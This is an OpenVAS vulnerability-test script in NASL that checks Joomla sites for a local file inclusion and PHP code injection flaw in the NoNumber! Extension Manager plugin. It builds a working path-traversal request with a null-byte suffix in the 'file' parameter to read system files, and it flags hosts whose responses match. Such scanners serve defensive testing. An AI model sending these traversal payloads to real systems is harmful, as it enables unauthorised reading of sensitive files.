###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_50191.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla NoNumber! Extension Manager Plugin Local File Include and PHP code Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "NoNumber! Extension Manager is prone to multiple input-validation
vulnerabilities because it fails to properly sanitize user-
supplied input.

An attacker can exploit these issues to inject arbitrary PHP code and
include and execute arbitrary files from the vulnerable system in the
context of the affected application. Other attacks are also possible.";

tag_solution = "Reports indicate vendor updates are available. Please contact the
vendor for more information.";

if (description)
{
 script_id(103308);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-10-20 15:15:44 +0200 (Thu, 20 Oct 2011)");
 script_bugtraq_id(50191);
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_name("Joomla NoNumber! Extension Manager Plugin Local File Include and PHP code Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50191");
 script_xref(name : "URL" , value : "http://www.nonumber.nl/extensions/nonumbermanager");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if installed NoNumber! Extension Manager is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("joomla_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("joomla/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if( ! dir = get_dir_from_kb(port:port, app:"joomla"))exit(0);
files = traversal_files();

foreach file (keys(files)) {

  url = string(dir,"/index.php?nn_qp=1&file=",crap(data:"../",length:3*9),files[file],"%00.inc.php"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);

